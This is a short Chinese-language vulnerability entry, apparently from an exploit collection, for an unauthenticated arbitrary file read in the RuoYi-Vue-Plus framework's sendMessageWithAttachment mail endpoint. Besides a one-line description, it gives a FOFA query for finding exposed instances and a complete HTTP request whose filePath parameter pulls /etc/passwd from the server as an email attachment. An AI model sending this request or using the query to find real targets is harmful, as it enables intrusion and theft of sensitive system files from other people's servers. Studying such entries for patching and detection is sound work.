## 若依-sendMessageWithAttachment-任意文件读取漏洞

## 一、漏洞简介
若依框架 sendMessageWithAttachment 接囗处存在任意文件读取漏洞,未经身份验证的远程攻击者通过漏洞可以获取到服务器敏感信息，导致系统处于极不安全的状态。

## fofa
```
body="RuoYi-Vue-Plus后台管理框架"
```

## poc
```
GET /demo/mail/sendMessageWithAttachment?to=xxx@xxx.com&passwd=xxxxxx&subject=Test-Mail&text=This%20is%20a%20test%20message&filePath=/etc/passwd HTTP/1.1
Host: [已模糊处理]
Upgrade-Insecure-Requests: 1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.66 Safari/537.36
Accept-Language: zh-CN,zh;q=0.9
Cache-Control: max-age=0
```
